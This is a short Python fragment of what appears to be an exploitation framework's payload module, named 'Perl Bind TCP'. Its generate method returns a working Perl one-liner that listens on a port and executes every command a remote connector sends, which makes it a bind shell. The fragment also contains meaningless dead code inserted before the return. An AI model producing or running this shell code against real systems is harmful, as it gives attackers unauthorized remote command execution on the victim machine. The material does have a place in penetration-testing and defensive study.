...
class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {'name': 'Perl Bind TCP', 'description': 'Creates interactive tcp bind shell by using perl.', 'authors': ('Marcin Bury <marcin[at]threat9.com>',)}
    ...
    def generate(self):
        if False:
            while True:
                i = 10
        return 'use IO;foreach my $key(keys %ENV){' + 'if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,' + str(self.rport) + ',Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){' + 'if($_=~ /(.*)/){system $1;}};'